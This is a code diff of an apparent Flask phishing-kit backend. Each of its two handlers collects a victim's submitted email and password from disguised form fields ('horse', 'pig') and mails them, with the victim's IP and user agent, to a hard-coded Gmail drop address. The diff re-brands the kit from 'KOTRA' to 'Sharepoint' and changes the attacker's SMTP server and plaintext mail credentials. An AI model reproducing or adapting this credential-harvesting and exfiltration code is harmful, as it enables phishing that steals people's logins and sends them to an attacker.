@@ -191,13 +191,13 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@quilmaz.space"
+        sender_email = "sharepoint@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "jerrygood618@gmail.com"
-        password = "vip0c54914629be"
+        receiver_email = "soonchionng1934@gmail.com"
+        password = "i!pIFujYV}5C"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs "
+        message["Subject"] = "Sharepoint Logs "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -210,8 +210,8 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("194.61.120.234", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         # Set session value and redirect
         session['eman'] = email  # Save email as session variable
@@ -231,13 +231,13 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "contact@quilmaz.space"
+        sender_email = "sharepoint@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "jerrygood618@gmail.com"
-        password = "vip0c54914629be"
+        receiver_email = "soonchionng1934@gmail.com"
+        password = "i!pIFujYV}5C"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOTRA$$ Logs  !! "
+        message["Subject"] = "Sharepoint Logs  !! "
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -250,8 +250,8 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP("194.61.120.234", 6040) as server:
-            server.login(sender_emaill, password)
+        with smtplib.SMTP_SSL("guide-level.com", 465) as server:
+            server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         session['ins'] = email  # Save email as session variable
         return redirect(url_for('lasmo', web=email))
